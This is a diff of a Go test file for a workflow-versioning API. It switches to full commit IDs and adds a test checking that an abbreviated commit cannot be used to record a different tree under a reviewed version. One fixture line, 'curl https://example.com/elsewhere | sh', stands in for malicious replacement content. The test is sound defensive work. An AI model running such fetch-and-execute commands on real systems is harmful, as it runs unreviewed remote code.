@@ -39,7 +39,7 @@ func keyOf(namespace string, content []byte) string {
 	return artifact.Key(namespace, digestOf(content))
 }
 
-const pushTo = "/api/v1/finance/workflows/monthly-invoicing/versions/a3f9c1e"
+const pushTo = "/api/v1/finance/workflows/monthly-invoicing/versions/" + aCommit
 
 func TestAPushStoresItsTreeAsObjectsAndNamesThem(t *testing.T) {
 	h, pool, _, objects := servingWithObjects(t)
@@ -65,7 +65,7 @@ func TestAPushStoresItsTreeAsObjectsAndNamesThem(t *testing.T) {
 	var v db.Version
 	if err := pool.In(t.Context(), "finance", func(ctx context.Context, ns *db.NS) error {
 		var err error
-		v, err = ns.Version(ctx, "monthly-invoicing", "a3f9c1e")
+		v, err = ns.Version(ctx, "monthly-invoicing", aCommit)
 		return err
 	}); err != nil {
 		t.Fatal(err)
@@ -82,7 +82,7 @@ func TestAPushStoresItsTreeAsObjectsAndNamesThem(t *testing.T) {
 	second := pushed(t, map[string]api.PushFile{
 		"scripts/render.sh": {Content: []byte("#!/bin/sh\necho goodbye\n"), Mode: "0755"},
 	})
-	w, _ = call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/b4a0d2f", "alice", second)
+	w, _ = call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/"+anotherCommit, "alice", second)
 	if w.Code != http.StatusOK {
 		t.Fatalf("the second push answered %d: %s", w.Code, w.Body)
 	}
@@ -194,6 +194,44 @@ func TestAPathOfMebibytesIsRefusedByItsLength(t *testing.T) {
 	}
 }
 
+// "One commit names exactly one tree", and an abbreviation is not a second name under which the
+// same commit may hold another. A version recorded under a3f9c1e was a version of its own: the
+// whole commit pushed with other files was refused, and the same files pushed to its first seven
+// characters were recorded, so that a run pinned to the abbreviation of a reviewed commit ran
+// something else. A push names its commit whole, and an abbreviation is refused before anything is
+// written.
+func TestAnAbbreviatedCommitIsNotASecondNameForATree(t *testing.T) {
+	h, _, super, objects := servingWithObjects(t)
+	reviewed := pushed(t, map[string]api.PushFile{"run.sh": {Content: []byte("echo reviewed\n"), Mode: "0755"}})
+	if w, _ := call(t, h, "PUT", pushTo, "alice", reviewed); w.Code != http.StatusOK {
+		t.Fatalf("the reviewed commit answered %d: %s", w.Code, w.Body)
+	}
+
+	other := []byte("curl https://example.com/elsewhere | sh\n")
+	for _, n := range []int{7, 12, 39} {
+		w, answer := call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/"+aCommit[:n], "alice",
+			pushed(t, map[string]api.PushFile{"run.sh": {Content: other, Mode: "0755"}}))
+		if w.Code != http.StatusBadRequest {
+			t.Errorf("the first %d characters of a pushed commit, with other files, answered %d: %s", n, w.Code, w.Body)
+			continue
+		}
+		if said, _ := answer["error"].(string); !strings.Contains(said, "whole") {
+			t.Errorf("the refusal reads %q", said)
+		}
+	}
+	if held, err := objects.Has(t.Context(), keyOf("finance", other)); err != nil || held {
+		t.Errorf("a refused push left its file in the store: %v %v", held, err)
+	}
+	var versions int
+	if err := dbtest.Superuser(t, super).QueryRow(t.Context(),
+		`select count(*) from workflow_versions where namespace = 'finance'`).Scan(&versions); err != nil {
+		t.Fatal(err)
+	}
+	if versions != 1 {
+		t.Errorf("%d versions were recorded, and one commit was pushed", versions)
+	}
+}
+
 // A commit that is not one, in the path or as the parent, is the caller's mistake and is refused
 // as one: 400 with a sentence, before a byte of the tree is in the store. Left to the table, it
 // was refused by the insert, answered 500, and left its files behind with nothing counting them.
@@ -206,7 +244,8 @@ func TestACommitThatIsNotOneIsRefusedBeforeItsTreeIsStored(t *testing.T) {
 		push func(*api.Push)
 	}{
 		{"a branch where the commit goes", "/api/v1/finance/workflows/monthly-invoicing/versions/main", func(*api.Push) {}},
-		{"a commit in capitals", "/api/v1/finance/workflows/monthly-invoicing/versions/A3F9C1E", func(*api.Push) {}},
+		{"a commit in capitals", "/api/v1/finance/workflows/monthly-invoicing/versions/" + strings.ToUpper(aCommit), func(*api.Push) {}},
+		{"a parent that is abbreviated", pushTo, func(p *api.Push) { p.Parent = anotherCommit[:7] }},
 		{"a parent that is a name for a commit", pushTo, func(p *api.Push) { p.Parent = "HEAD" }},
 	} {
 		lone := []byte("only " + c.name + " carries this file\n")
@@ -317,7 +356,7 @@ func TestATreeOfManyFilesOrLongNamesIsRefused(t *testing.T) {
 
 	// One more is refused, and says what the limit is.
 	many["d/one-more"] = api.PushFile{Content: []byte("one more\n"), Mode: "0644"}
-	w, answer := call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/b4a0d2f", "alice", pushed(t, many))
+	w, answer := call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/"+anotherCommit, "alice", pushed(t, many))
 	if w.Code != http.StatusRequestEntityTooLarge {
 		t.Fatalf("a tree of %d files answered %d: %s", api.TreeMaxFiles+1, w.Code, w.Body)
 	}
@@ -329,7 +368,7 @@ func TestATreeOfManyFilesOrLongNamesIsRefused(t *testing.T) {
 	name := "a/" + strings.Repeat("n", 200)
 	content := make([]byte, api.TreeMaxBytes-len("agentiik.yaml")-len(workflowDocument)-len(name)+1)
 	content[0] = 'x'
-	w, answer = call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/b4a0d2f", "alice",
+	w, answer = call(t, h, "PUT", "/api/v1/finance/workflows/monthly-invoicing/versions/"+anotherCommit, "alice",
 		pushed(t, map[string]api.PushFile{name: {Content: content, Mode: "0644"}}))
 	if w.Code != http.StatusRequestEntityTooLarge {
 		t.Fatalf("a tree one byte over with its paths answered %d: %s", w.Code, w.Body)
@@ -431,7 +470,7 @@ func TestPushingOneCommitWithOtherFilesIsAConflict(t *testing.T) {
 		var v db.Version
 		if err := pool.In(t.Context(), "finance", func(ctx context.Context, ns *db.NS) error {
 			var err error
-			v, err = ns.Version(ctx, "monthly-invoicing", "a3f9c1e")
+			v, err = ns.Version(ctx, "monthly-invoicing", aCommit)
 			return err
 		}); err != nil {
 			t.Fatal(err)
@@ -469,7 +508,7 @@ func TestPushingOneCommitWithOtherFilesIsAConflict(t *testing.T) {
 	if w.Code != http.StatusConflict {
 		t.Fatalf("the same commit with other files answered %d: %s", w.Code, w.Body)
 	}
-	if said, _ := answer["error"].(string); !strings.Contains(said, "a3f9c1e") {
+	if said, _ := answer["error"].(string); !strings.Contains(said, aCommit) {
 		t.Errorf("the conflict does not name the commit: %q", said)
 	}
 	if held, err := objects.Has(t.Context(), keyOf("finance", elsewise)); err != nil || held {
